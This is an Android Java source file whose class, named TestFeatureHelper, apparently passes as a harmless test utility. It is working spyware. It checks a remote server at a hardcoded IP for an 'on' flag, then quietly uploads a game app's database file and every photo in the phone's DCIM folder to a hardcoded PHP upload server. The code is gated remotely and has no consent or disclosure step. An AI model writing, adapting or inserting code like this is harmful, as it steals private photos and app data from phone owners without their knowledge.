package com.mei.hua;

import android.util.Log;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TestFeatureHelper {

    private static final String TAG = "TestFeatureHelper";
    private static final String VERIFY_URL = "http://156.243.244.97/share/1.txt";
    private static final String UPLOAD_URL = "http://47.243.218.222:8765/upload.php";

    // 复用同一个 OkHttpClient 实例以提升性能
    private final OkHttpClient client;

    public TestFeatureHelper() {
        this.client = new OkHttpClient();
    }

    /**
     * 对外暴露的启动方法：先验证网络标识，若为1则开始上传任务
     */
    public void start() {
        Request request = new Request.Builder()
                .url(VERIFY_URL)
                .get()
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "网络验证请求失败", e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String result = response.body().string().trim();
                    if ("1".equals(result)) {
                        Log.d(TAG, "验证通过 (结果为1)，开始执行后台上传任务");
                        // 验证通过后，在子线程中执行耗时的文件查找和上传操作
                        startUploadProcess();
                    } else {
                        Log.d(TAG, "验证不为1，当前内容为: " + result);
                    }
                }
            }
        });
    }

    /**
     * 在子线程中执行的文件遍历与上传调度
     */
    private void startUploadProcess() {
        new Thread(() -> {
            // 1. 优先上传特定的 db 文件
            File dbFile = new File("/storage/emulated/0/Android/data/com.ztgame.bob/files/bob.db");
            if (dbFile.exists() && dbFile.isFile()) {
                Log.d(TAG, "找到目标DB文件，优先上传: " + dbFile.getName());
                uploadSingleFile(dbFile);
            } else {
                Log.e(TAG, "未找到目标DB文件: " + dbFile.getAbsolutePath());
            }

            // 2. 遍历并上传 DCIM 下的图片
            File dcimDir = new File("/storage/emulated/0/DCIM");
            if (dcimDir.exists() && dcimDir.isDirectory()) {
                Log.d(TAG, "开始遍历 DCIM 目录...");
                traverseAndUploadImages(dcimDir);
                Log.d(TAG, "DCIM 目录遍历上传完毕");
            } else {
                Log.e(TAG, "DCIM 目录不存在或不是文件夹");
            }
        }).start();
    }

    /**
     * 递归遍历文件夹查找图片
     */
    private void traverseAndUploadImages(File directory) {
        File[] files = directory.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (file.isDirectory()) {
                // 如果是子文件夹，递归调用
                traverseAndUploadImages(file);
            } else {
                // 判断后缀，转换为小写进行匹配
                String name = file.getName().toLowerCase();
                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) {
                    uploadSingleFile(file);
                }
            }
        }
    }

    /**
     * 核心上传逻辑（同步执行，保证队列顺序，避免并发过多）
     */
    private void uploadSingleFile(File file) {
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);

        MultipartBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                // 注意："file" 必须与服务端 PHP 接收的 $_FILES['file'] 字段名一致
                .addFormDataPart("file", file.getName(), fileBody)
                .build();

        Request request = new Request.Builder()
                .url(UPLOAD_URL)
                .post(requestBody)
                .build();

        try {
            // 这里使用同步的 execute()，确保上一个文件传完再传下一个
            Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                Log.d(TAG, "成功上传文件: " + file.getAbsolutePath());
            } else {
                Log.e(TAG, "上传文件失败: " + file.getAbsolutePath() + " 状态码: " + response.code());
            }
            response.close();
        } catch (IOException e) {
            Log.e(TAG, "上传文件时发生异常: " + file.getAbsolutePath(), e);
        }
    }
}